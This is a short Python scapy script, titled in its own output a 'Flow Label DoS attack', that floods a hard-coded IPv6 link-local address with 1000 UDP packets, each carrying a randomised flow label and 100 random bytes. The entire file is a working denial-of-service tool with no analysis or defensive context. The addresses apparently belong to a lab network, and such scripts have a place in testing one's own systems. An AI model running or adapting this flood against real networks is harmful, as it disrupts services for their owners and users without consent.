import binascii
from scapy.all import *
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6

number_packets = 1000
destination = "fe80::a00:27ff:fe4c:1052"
source = "fe80::a00:27ff:fe3b:c7d"
s_port = 1055
d_port = 53


def flow_label_DOS():
    print ("Flow Label DoS attack")
    l3 = None
    l3 = IPv6(src=source, dst=destination, fl=RandNum(1, 1048575))
    l4 = UDP()
    payload = Raw(load=RandString(100))
    packets = l3/l4/payload
    packets.show()
    send(packets, count=int(number_packets))


flow_label_DOS()
